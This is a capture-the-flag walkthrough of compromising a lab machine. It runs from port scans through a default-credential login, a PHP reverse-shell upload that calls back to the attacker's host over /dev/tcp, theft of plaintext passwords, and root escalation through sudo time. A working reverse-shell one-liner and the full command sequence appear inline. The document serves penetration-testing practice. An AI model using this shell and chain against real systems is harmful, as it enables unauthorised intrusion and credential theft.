Target:  192.168.169.111

nmap -sV -sC -p- 192.168.169.111 --open -oN FunboxEasy.scan

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 21:42 GMT

Nmap scan report for 192.168.169.111

Host is up (0.069s latency).

Not shown: 64870 closed tcp ports (conn-refused), 663 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   3072 b2d8516ec584051908ebc8582713132f (RSA)

|   256 b0de9703a72ff4e2ab4a9cd9439b8a48 (ECDSA)

|_  256 9d0f9a26384f0180a7a6809dd1d4cfec (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works

|_http-server-header: Apache/2.4.41 (Ubuntu)

| http-robots.txt: 1 disallowed entry 

|_gym

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Now since a apache webserver is open I'll run gobuster against it

  

gobuster dir -u http://192.168.169.111:80 -w /usr/share/wordlists/dirb/common.txt                     21:44:44

  

===============================================================

Gobuster v3.5

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.169.111:80

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                /usr/share/wordlists/dirb/common.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.5

[+] Timeout:                 10s

===============================================================

2023/06/11 21:44:45 Starting gobuster in directory enumeration mode

===============================================================

/.htpasswd            (Status: 403) [Size: 280]

/.hta                 (Status: 403) [Size: 280]

/admin                (Status: 301) [Size: 318] [--> http://192.168.169.111/admin/]

/.htaccess            (Status: 403) [Size: 280]

/index.html           (Status: 200) [Size: 10918]

/index.php            (Status: 200) [Size: 3468]

/robots.txt           (Status: 200) [Size: 14]

/secret               (Status: 301) [Size: 319] [--> http://192.168.169.111/secret/]

/server-status        (Status: 403) [Size: 280]

/store                (Status: 301) [Size: 318] [--> http://192.168.169.111/store/]

Progress: 4587 / 4615 (99.39%)

===============================================================

2023/06/11 21:45:22 Finished

went to /store and saw the admin login at the bottom.

  

Used default creds admin:admin and I got in

  

There is a new book editor where I can add new books.

[https://i.imgur.com/wlc1q17.png](https://i.imgur.com/wlc1q17.png)

Attempt to upload a reverse shell in php format since the admin_add page is in php format 

  

my rev shell in php

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.201/4444 0>&1'"); ?>

and to run a nc listener 

nc -nlvp 4444

  

now to run the shell

Another image is at a url of

  

[http://192.168.169.111/store/bootstrap/img/c_sharp_6.jpg](http://192.168.169.111/store/bootstrap/img/c_sharp_6.jpg)

  

so I'll replace it with my image

  

And I''m in

  

nc -nlvp 4444                                                                                                                       21:51:14                                                                                           

  

listening on [any] 4444 ...                                                                                                                                                                                                                 

connect to [192.168.45.201] from (UNKNOWN) [192.168.169.111] 47264                                                                                                                                                                          

bash: cannot set terminal process group (842): Inappropriate ioctl for device                                                                                                                                                               

bash: no job control in this shell                                                                                                                                                                                                          

www-data@funbox3:/var/www/html/store/bootstrap/img$ ls                                                                                                                                                                                      

ls

android_studio.jpg

beauty_js.jpg

c_14_quick.jpg

c_sharp_6.jpg

doing_good.jpg

img1.jpg

img2.jpg

img3.jpg

kotlin_250x250.png

logic_program.jpg

mobile_app.jpg

pro_asp4.jpg

pro_js.jpg

revshell.php

unnamed.png

web_app_dev.jpg

cd home/

www-data@funbox3:/home$ ls 

ls

tony

www-data@funbox3:/home$ cd tony

cd tony

www-data@funbox3:/home/tony$ ls

ls

password.txt

www-data@funbox3:/home/tony$ cat pas

cat password.txt 

ssh: yxcvbnmYYY

gym/admin: asdfghjklXXX

/store: admin@admin.com admin

explored for tony's info and found his ssh info

  

Got  into Tony's account

  

ssh tony@192.168.169.111                                                                                                                                                                                                       21:56:37

The authenticity of host '192.168.169.111 (192.168.169.111)' can't be established.

ED25519 key fingerprint is SHA256:sMY2EwBNywi3V/cmpdMCtvcC6NM31k0H9CTRlsxALfY.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '192.168.169.111' (ED25519) to the list of known hosts.

tony@192.168.169.111's password: 

Permission denied, please try again.

tony@192.168.169.111's password: 

Permission denied, please try again.

tony@192.168.169.111's password: 

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

  

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

  

  System information as of Sun Jun 11 21:58:14 UTC 2023

  

  System load:  0.88              Processes:               156

  Usage of /:   76.7% of 4.66GB   Users logged in:         0

  Memory usage: 58%               IPv4 address for ens256: 192.168.169.111

  Swap usage:   0%

  

  

60 updates can be installed immediately.

0 of these updates are security updates.

To see these additional updates run: apt list --upgradable

  

  

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

  

  

The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.

  

To run a command as administrator (user "root"), use "sudo <command>".

See "man sudo_root" for details.

  

tony@funbox3:~$ 

now to check for sudo privileged  lists

tony@funbox3:/$ sudo -l

Matching Defaults entries for tony on funbox3:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  

User tony may run the following commands on funbox3:

    (root) NOPASSWD: /usr/bin/yelp

    (root) NOPASSWD: /usr/bin/dmf

    (root) NOPASSWD: /usr/bin/whois

    (root) NOPASSWD: /usr/bin/rlogin

    (root) NOPASSWD: /usr/bin/pkexec

    (root) NOPASSWD: /usr/bin/mtr

    (root) NOPASSWD: /usr/bin/finger

    (root) NOPASSWD: /usr/bin/time

    (root) NOPASSWD: /usr/bin/cancel

    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh

  

I can escalate through the time command

  

tony@funbox3:/$ sudo time /bin/bash

root@funbox3:/# cd

root@funbox3:~# ls

proof.txt  root.flag  snap

root@funbox3:~# cat root.flag 

Your flag is in another file...

root@funbox3:~# cat proof.txt 

50e46a8fbd4f1793c405c4e99729065a

root@funbox3:~# whoami

root

I had to go back and look for the now root flag which was here

  

root@funbox3:/# cd var/www/

root@funbox3:/var/www# ls

html  local.txt

root@funbox3:/var/www# cat local.txt 

9a865fd61ade324bb6f8ef8831d5964b

boot2root